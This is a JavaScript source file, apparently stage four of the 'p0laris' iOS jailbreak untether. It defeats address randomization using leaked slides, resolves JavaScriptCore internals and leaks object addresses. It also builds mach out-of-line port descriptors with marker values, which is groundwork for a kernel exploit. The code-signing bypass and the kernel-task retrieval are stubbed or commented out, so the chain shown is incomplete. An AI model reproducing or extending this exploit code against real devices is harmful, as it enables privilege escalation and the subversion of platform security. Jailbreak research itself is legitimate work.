var socket = scall_wrapper("socket");
var htons = scall_wrapper("htons");
var inet_addr = scall_wrapper("inet_addr");
var dup2 = scall_wrapper("dup2");
var bind = scall_wrapper("bind");
var listen = scall_wrapper("listen");
var accept = scall_wrapper("accept");
var close = scall_wrapper("close");
var printf = scall_wrapper("printf");
var reboot = scall_wrapper("reboot");
var AF_INET = 2;
var SOCK_DGRAM = 2;
var SOCK_DGRAM = 2;
var IPPROTO_UDP = 17;
var UNSLID_BASE = 0x4000;

function prep_shit() {
	string_ref = scall("JSStringCreateWithUTF8CString", "victim");
	global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
	jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
	large_buf_ptr = leak_vec(large_buf);
}

function csbypass_wrapper() {
	if (csbypass == undefined) {
		p0laris_log("[*] you're probably running a public build of the untether. i don't have permission to distribute this code yet. sorry.");
		return;
	} else {
		csbypass();
	}
}

function csbypass_stage4() {
	csbypass_wrapper();

	return 0;
}

function main() {
	syslog(LOG_SYSLOG, "__p0laris_LOG_START__");
	p0laris_log("[*] we out here");
	p0laris_log("[*] landed in stage4");

	p0laris_log("[*] p0laris.dyld_shc_slide=0x%08x\n", p0laris.dyld_shc_slide);
	p0laris_log("[*] p0laris.racoon_slide=0x%08x\n", p0laris.racoon_slide);

//	printf = p0laris_log;

	printf("test");

	var dyld_shc_slide = get_dyld_shc_slide();

	sym_cache["JSStringCreateWithUTF8CString"] = JSStringCreateWithUTF8CString + dyld_shc_slide;
	sym_cache["JSObjectGetProperty"] = JSObjectGetProperty + dyld_shc_slide;
	sym_cache["JSContextGetGlobalObject"] = JSContextGetGlobalObject + dyld_shc_slide;
	prep_shit();

	var init_port_set = new mach_msg_ool_ports_descriptor_t(4);
	var addy = init_port_set.addy;
	var init_port_set_obj = init_port_set.deref();
	init_port_set_obj.address = 0x41414141;
	init_port_set_obj.count = 0x42424242;
	init_port_set_obj.disposition = 19;
	init_port_set_obj.deallocate = false;
	init_port_set_obj.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	p0laris_log("%x", addy);
	init_port_set.write(init_port_set_obj, 0);
	init_port_set.write(init_port_set_obj, 1);
	init_port_set.write(init_port_set_obj, 2);
	init_port_set.write(init_port_set_obj, 3);
	p0laris_log("%s %s %s %s", JSON.stringify(init_port_set.deref(0)),
							   JSON.stringify(init_port_set.deref(1)),
							   JSON.stringify(init_port_set.deref(2)),
							   JSON.stringify(init_port_set.deref(3)));

//	var tfp0 = get_kernel_task();

	syslog(LOG_SYSLOG, "__p0laris_LOG_END__");
	return 0;
}